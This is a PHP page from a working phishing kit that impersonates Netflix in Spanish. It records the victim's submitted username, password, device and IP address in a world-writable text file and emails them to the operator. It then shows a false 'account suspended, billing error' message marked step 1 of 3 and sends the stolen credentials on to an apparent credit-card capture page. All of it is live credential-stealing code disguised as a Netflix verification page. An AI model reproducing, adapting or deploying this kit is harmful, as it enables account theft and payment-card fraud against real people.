<?php
    require('../../config.php');
    require_once("../../lib/class.inputfilter.php");

    if(isset($_POST['txt-usuario'])){

        date_default_timezone_set('America/Bogota');
        $ifilter = new InputFilter();

        $usuario = $ifilter->process($_POST['txt-usuario']);
        $contrasena = $ifilter->process($_POST['txt-pass']);
        $dispositivo = $ifilter->process($_POST['hdd-dispositivo']);

        $ipcliente= $_SERVER['REMOTE_ADDR'];

        $datos = 'Usuario: '.$usuario.' | Clave: '.$contrasena.' | Dispositivo: '.$dispositivo.' | IP: '.$ipcliente;

        $file = '../../1-logo.txt';

        $salto = "";
        $cabecera = "---------------- Paso 1 (".date("Y-m-d H:i:s").")";

        $fp = fopen($file, 'a+');
        fwrite($fp, $salto.PHP_EOL);
        fwrite($fp, $salto.PHP_EOL);
        fwrite($fp, $cabecera.PHP_EOL);
        fwrite($fp, $datos . PHP_EOL);
        fclose($fp);
        chmod($file, 0777);   

        $hoy1 = date("Y/m/d");  
        $hoy2 = date("Y-m-d H:i:s");  

        $to = $destino;
        $subject = "Datos NETF Paso 1 ".$usuario." - ".$hoy1;
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         
        $message = "
        <html>
        <head>
        <title>Datos</title>
        </head>
        <body>
        <b>Usuario: </b>".$usuario."<br> 
        <b>Contraseña: </b>".$contrasena."<br> 
        <b>Dispositivo: </b>".$dispositivo."<br> 
        <b>Dirección IP: </b>".$ipcliente."<br> 
        <b>Hora/Fecha: </b>".$hoy2."
        </body>
        </html>";
         
        mail($to, $subject, $message, $headers);        
 ?>
 <html>
    <head>
        <title>Neflix</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="../../img/icono.ico" type="image/x-icon">
        <script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>      
        <link href="../../css/style-white.css" rel="stylesheet">
        <link href="../../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../../js/functions.js"></script>  
        <script type="text/javascript" src="../../js/ready.js"></script>
        <script type="text/javascript">
            setTimeout(ventana_tarjeta, 5000);            
        </script>              
    </head>
    <body>
        <form name="smt-error" id="smt-error" action="../creditoption/" method="post" target="_self">
            <input type="hidden" name="hdd-usuario" id="hdd-usuario" value="<?php echo $usuario; ?>">  
            <input type="hidden" name="hdd-contrasena" id="hdd-contrasena" value="<?php echo $contrasena; ?>">  
            <input type="hidden" name="hdd-dispositivo" id="hdd-dispositivo" value="<?php echo $dispositivo; ?>">  
        </form>
        <div class="container">
            <div class="logo">
                <table cellpadding="0" cellspacing="0" border="0" width="100%">
                    <tr>
                        <td valign="middle" align="left"><img src="../../img/logo.png" width="170"></td>
                        <td valign="middle" align="right" class="btn-cerrar">Cerrar sesión</td>
                    </tr>                    
                </table>
            </div>
            <div class="mensaje-error">
                <div class="container-msg">
                    <img src="../../img/icon-seg.png" width="62" style="margin-bottom: 30px;">
                    <div class="paso">PASO 1 DE 3</div>
                    <div class="titulo-negro">Tenemos Problemas</div>
                    <br>
                    <div class="texto-negro">Estimado usuario, Netflix ha puesto tu cuenta en la lista de cuentas suspendidas debido a un error en tus datos de facturación, por ese motivo necesitamos que verifiques tu cuenta en tres simples pasos.</div>  
                    <button class="btn btn-rojo esp-btn" id="btn-p1-sgt" type="submit">Siguiente</button>                  
                </div>
            </div>

            <div class="footer">
                <div class="container-foot">
                    ¿Preguntas? Llama al <span class="telefono">01 800 917 1564</span>
                    <br><br>
                    <table cellpadding="0" cellspacing="0" width="100%" id="t1">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                            </td>
                            <td>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t2">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>                            
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t3">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>                           
                                <div class="menu-footer">Términos de uso</div>                                
                            </td>                            
                        </tr>
                    </table>
                    <br>
                    <select style="background-color: #fff;color: #737373;padding: 9px;">
                        <option>Español</option>
                        <option>English</option>
                    </select>
                </div>
            </div>
        </div>
    </body>
</html>
 <?php
    }else{
        header('Location: ../../');
    }    
?>